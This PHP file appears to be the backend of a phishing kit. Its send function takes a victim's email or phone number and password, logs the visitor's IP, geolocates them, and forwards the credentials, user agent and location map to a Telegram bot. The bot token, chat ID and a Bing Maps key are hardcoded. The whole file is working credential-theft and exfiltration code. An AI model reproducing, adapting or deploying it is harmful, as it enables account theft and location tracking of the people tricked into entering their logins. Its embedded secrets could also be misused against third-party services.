<?php


  if ($active=="On") {
    //close(1);
    echo "Api 1-On";
    $correo="test";
    $contraseña="test";
   send($correo,$contraseña,$TXT);



   
  }else {

  }


  function close($cm){
    echo '<body Onload="">ok<script>console.log("on2");window.close();</script></body>';
    exit;
  }


function send($d1,$d2,$TXT){
    
$api = "5824157290:AAFWq9ZL9TM-miEacZTPJaWIDubuKbBPc3I";
$chatid = -1001970676293;// ID pvchat"-1001660666030";
$keymap="AmTuvVDNNSHfJ7SdQWGHncbXOcN4dUd7xweFBrkqSbRaP0M4nWMTE0vOYkzgPRbm";


$file = fopen("VISIT.txt","a");

fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/"));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
$lat = $IP_LOOKUP->lat; //primera 18,000
$lon =$IP_LOOKUP->lon;
$lon=$lon.'/18?';
$ip = $IP_LOOKUP->query . "\r\n";
$geomap='https://dev.virtualearth.net/REST/v1/Imagery/Map/AerialWithLabels/'.$lat.','.$lon.'mapSize=600,600&key=AmTuvVDNNSHfJ7SdQWGHncbXOcN4dUd7xweFBrkqSbRaP0M4nWMTE0vOYkzgPRbm';

$UA = $_SERVER['HTTP_USER_AGENT'];

$img=urlencode($geomap);
//$msg=$TXT;
$msg="<b>IP</b>🌐: <code>".$ip."</code><b>Correo O Numero</b>👤: <code>".$d1."\n</code><b>Contraseña</b>🔒: <code>".$d2."</code>\n<b>User-Agent</b> 🎁: <code>".$UA."</code>\n\n<b>Country</b> 🗺️: <code>".$COUNTRY."</code><b>City</b>🌆: <code>" .$CITY."</code><b>Region</b> 🌎: <code>" .$REGION."</code> <b>State</b>🗽: <code>" .$STATE."</code> <b>Zip Code</b> ✉️: <code>" .$ZIPCODE."</code>";
$imgtext="Localizacion del usuario: "."Lat: ".$lat." Lon:".$lon;

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."&parse_mode=HTML" );
//enviar img
file_get_contents("https://api.telegram.org/bot".$api."/sendPhoto?chat_id=".$chatid."&caption=".$imgtext."&photo=".$img );
//
close(1);
}